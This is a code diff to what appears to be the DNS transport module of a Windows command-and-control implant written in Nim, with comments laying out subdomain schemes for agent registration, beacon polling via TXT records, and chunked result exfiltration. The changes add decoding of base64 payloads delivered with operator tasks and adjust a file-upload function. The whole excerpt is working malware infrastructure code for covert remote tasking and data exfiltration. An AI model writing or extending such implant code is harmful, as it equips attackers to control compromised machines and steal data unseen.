@@ -4,7 +4,7 @@
 ## Register: reg.<b32-chunks>.<seq>.<total>.<agentid>.<domain>
 ## Beacon:   poll.<agentid>.<domain>  → TXT = tasks or "nil"
 ## Result:   res.<b32-chunk>.<seq>.<total>.<taskid-hex>.<agentid>.<domain>
-import std/[json, strutils, strformat]
+import std/[json, strutils, strformat, base64]
 import winim/lean
 import config
 
@@ -273,6 +273,8 @@ proc beacon*(t: var AgentTransport): seq[TaskWire] =
     var task = TaskWire(id:   j["id"].getBiggestInt(),
                         typ:  j["type"].getStr(),
                         args: j{"args"}.getStr(""))
+    let pl = j{"payload"}.getStr("")
+    if pl.len > 0: task.payload = cast[seq[byte]](base64.decode(pl))
     result.add(task)
   except: discard
 
@@ -291,9 +293,10 @@ proc sendResult*(t: var AgentTransport; taskId: int64; output, errStr: string) =
   t.sendResultAdmin(taskId, output, errStr, false)
 
 proc uploadFile*(t: var AgentTransport; taskId: int64;
-                 filename: string; data: seq[byte]) =
+                 filename: string; data: seq[byte]): bool =
   t.sendResult(taskId, "file:" & filename & ":size=" & $data.len,
                "upload-not-supported-over-dns")
+  return false
 
 proc downloadFile*(t: var AgentTransport; filename: string): seq[byte] =
   return @[]
